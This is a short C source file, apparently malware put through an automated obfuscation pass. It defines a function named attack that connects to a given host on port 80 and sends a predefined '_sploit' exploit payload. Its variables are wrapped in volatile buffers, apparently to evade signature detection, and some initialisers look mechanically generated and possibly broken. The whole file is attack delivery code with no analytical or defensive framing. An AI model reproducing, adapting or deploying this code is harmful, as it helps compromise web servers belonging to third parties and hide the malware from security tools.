#pragma optimize("", off)

#include "data_globals.h"
#include <stdlib.h>
#include <string.h>

void attack(char *hostname) {
    // Transform SOCKET s
    volatile SOCKET s_buf[2] = {{0, (SOCKET)0}};
    volatile SOCKET *p_s = (volatile SOCKET *)&s_buf[0];

    // Transform struct hostent *he
    struct hostent* volatile he_buf[2] = {{NULL, (struct hostent*)0}};
    struct hostent* volatile *p_he = (struct hostent* volatile *)&he_buf[0];

    SOCKADDR_IN addr;

    // Transform int i
    volatile int i_buf[2] = {{0, (int)0}};
    volatile int *p_i = (volatile int *)&i_buf[0];

    (*p_s) = socket(AF_INET, SOCK_STREAM, 0);
    if ((*p_s) == INVALID_SOCKET) return;

    (*p_he) = gethostbyname(hostname);
    if (!(*p_he)) { closesocket((*p_s)); return; }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = *((unsigned long *)(*p_he)->h_addr_list[0]);
    addr.sin_port = htons(80);

    (*p_i) = connect((*p_s), (struct sockaddr *)&addr, sizeof(addr));
    if ((*p_i) != 0) { closesocket((*p_s)); return; }

    send((*p_s), (const char *)_sploit, sizeof(_sploit), 0);
    closesocket((*p_s));
}

#pragma optimize("", on)
